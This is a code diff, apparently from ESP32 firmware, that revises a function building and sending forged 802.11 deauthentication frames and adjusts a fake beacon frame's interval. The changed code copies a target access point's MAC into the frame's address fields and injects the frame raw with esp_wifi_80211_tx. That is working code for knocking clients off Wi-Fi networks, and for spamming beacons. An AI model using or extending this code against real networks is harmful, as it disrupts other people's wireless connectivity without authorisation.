@@ -25,19 +25,18 @@ uint8_t deauthTemplate[26] = {
   /* 24 - 25 */ 0x01, 0x00                           // reason code (1 = unspecified reason)
 };
 
-uint32_t deauthdeadtime = 0;
 void sendDeauthPacket(AccessPoint* data, uint8_t mtarget[6]) {
   if (millis() - lastDeauth > 1000) {
     lastDeauth = millis();
     deauthPacketsPerSecond = deauthCounter / 1; 
     deauthCounter = 0;
   }
-  uint8_t deauthPacket[26];
+  static uint8_t deauthPacket[26];
   memcpy(deauthPacket, deauthTemplate, 26);
   memcpy(deauthPacket + 10, data->mac, 6);
   memcpy(deauthPacket + 16, data->mac, 6);
   esp_wifi_set_channel(data->data >> 4, WIFI_SECOND_CHAN_NONE);
-  esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+  ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false));
   deauthCounter++;
 }
 
@@ -162,7 +161,7 @@ uint8_t beaconFrame[109] = {
   // Fixed parameters
   /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (will be done by the SDK)
   /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
-  /* 32 - 33 */ 0x64, 0x00, // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
+  /* 32 - 33 */ 0xe8, 0x03, // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
   /* 34 - 35 */ 0x31, 0x00, // capabilities Tnformation
 
   // Tagged parameters
